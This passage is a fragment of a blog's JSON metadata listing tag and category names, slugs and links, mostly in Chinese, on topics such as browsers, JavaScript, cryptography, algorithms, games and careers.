V8","slug":"Google-Chrome-V8","link":"/tags/Google-Chrome-V8/"},{"name":"MIT挑战","slug":"MIT挑战","link":"/tags/MIT%E6%8C%91%E6%88%98/"},{"name":"计算机科学","slug":"计算机科学","link":"/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"},{"name":"CSS","slug":"CSS","link":"/tags/CSS/"},{"name":"动画","slug":"动画","link":"/tags/%E5%8A%A8%E7%94%BB/"},{"name":"编译原理","slug":"编译原理","link":"/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/"},{"name":"密码学","slug":"密码学","link":"/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/"},{"name":"异常处理","slug":"异常处理","link":"/tags/%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/"},{"name":"Deno","slug":"Deno","link":"/tags/Deno/"},{"name":"自定义元素","slug":"自定义元素","link":"/tags/%E8%87%AA%E5%AE%9A%E4%B9%89%E5%85%83%E7%B4%A0/"},{"name":"Javascript","slug":"Javascript","link":"/tags/Javascript/"},{"name":"函数式编程","slug":"函数式编程","link":"/tags/%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/"},{"name":"网络","slug":"网络","link":"/tags/%E7%BD%91%E7%BB%9C/"},{"name":"浏览器","slug":"浏览器","link":"/tags/%E6%B5%8F%E8%A7%88%E5%99%A8/"},{"name":"MutationObserver","slug":"MutationObserver","link":"/tags/MutationObserver/"},{"name":"网页消息推送","slug":"网页消息推送","link":"/tags/%E7%BD%91%E9%A1%B5%E6%B6%88%E6%81%AF%E6%8E%A8%E9%80%81/"},{"name":"Service Workers","slug":"Service-Workers","link":"/tags/Service-Workers/"},{"name":"Shadow DOM","slug":"Shadow-DOM","link":"/tags/Shadow-DOM/"},{"name":"渲染引擎","slug":"渲染引擎","link":"/tags/%E6%B8%B2%E6%9F%93%E5%BC%95%E6%93%8E/"},{"name":"Class","slug":"Class","link":"/tags/Class/"},{"name":"浏览器缓存","slug":"浏览器缓存","link":"/tags/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98/"},{"name":"WebRTC","slug":"WebRTC","link":"/tags/WebRTC/"},{"name":"跨站脚本攻击","slug":"跨站脚本攻击","link":"/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"},{"name":"Web Workers","slug":"Web-Workers","link":"/tags/Web-Workers/"},{"name":"WebAssembly","slug":"WebAssembly","link":"/tags/WebAssembly/"},{"name":"凯文·凯利","slug":"凯文·凯利","link":"/tags/%E5%87%AF%E6%96%87%C2%B7%E5%87%AF%E5%88%A9/"},{"name":"游戏","slug":"游戏","link":"/tags/%E6%B8%B8%E6%88%8F/"},{"name":"巫师三","slug":"巫师三","link":"/tags/%E5%B7%AB%E5%B8%88%E4%B8%89/"},{"name":"面试","slug":"面试","link":"/tags/%E9%9D%A2%E8%AF%95/"},{"name":"职业发展","slug":"职业发展","link":"/tags/%E8%81%8C%E4%B8%9A%E5%8F%91%E5%B1%95/"},{"name":"算法","slug":"算法","link":"/tags/%E7%AE%97%E6%B3%95/"},{"name":"排序","slug":"排序","link":"/tags/%E6%8E%92%E5%BA%8F/"},{"name":"同源策略","slug":"同源策略","link":"/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"},{"name":"Google Scholar","slug":"Google-Scholar","link":"/tags/Google-Scholar/"}],"categories":[{"name":"代码","slug":"代码","link":"/categories/%E4%BB%A3%E7%A0%81/"},{"name":"思考","slug":"思考","link":"/categories/%E6%80%9D%E8%80%83/"},{"name":"游戏","slug":"游戏","link":"/categories/%E6%B8%B8%E6%88%8F/"},{"name":"职业","slug":"职业","link":"/categories/%E8%81%8C%E4%B8%9A/"},{"name":"工具","slug":"工具","link":"/categories/%E5%B7%A5%E5%85%B7/"}]}